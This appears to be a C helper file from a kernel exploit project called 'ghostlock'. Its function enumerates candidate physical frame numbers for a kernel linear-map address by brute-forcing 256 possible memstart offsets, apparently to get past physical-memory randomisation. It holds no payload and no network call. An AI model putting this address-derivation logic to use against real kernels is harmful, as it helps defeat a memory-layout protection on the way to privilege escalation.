#include "perf_reclaim_gate.h"

#include "offset.h"

#define GHOSTLOCK_ORDER 3U
#define GHOSTLOCK_ORDER_BYTES (4096ULL << GHOSTLOCK_ORDER)
#define GHOSTLOCK_MEMSTART_BASE 0x80000000ULL
#define GHOSTLOCK_MEMSTART_QUANTUM 0x40000000ULL
#define GHOSTLOCK_MEMSTART_DRAWS 256U

size_t ghostlock_perf_build_candidates(
    uintptr_t page_base, uint64_t zone_start_pfn, uint64_t zone_end_pfn,
    struct ghostlock_perf_candidate *candidates, size_t capacity) {
  if (!candidates || capacity == 0 || zone_end_pfn <= zone_start_pfn ||
      page_base < (uintptr_t)P0_PAGE_OFFSET ||
      (page_base & (GHOSTLOCK_ORDER_BYTES - 1)) != 0)
    return 0;

  size_t count = 0;
  uint64_t linear_offset = (uint64_t)page_base - (uint64_t)P0_PAGE_OFFSET;
  for (uint64_t draw = 0; draw < GHOSTLOCK_MEMSTART_DRAWS; ++draw) {
    uint64_t memstart =
        GHOSTLOCK_MEMSTART_BASE - draw * GHOSTLOCK_MEMSTART_QUANTUM;
    uint64_t physical = linear_offset + memstart;
    uint64_t pfn = physical >> 12;
    if ((physical & (GHOSTLOCK_ORDER_BYTES - 1)) != 0 ||
        pfn < zone_start_pfn || pfn >= zone_end_pfn)
      continue;
    if (count >= capacity)
      return capacity + 1;
    candidates[count].pfn = pfn;
    candidates[count].memstart = memstart;
    ++count;
  }
  return count;
}
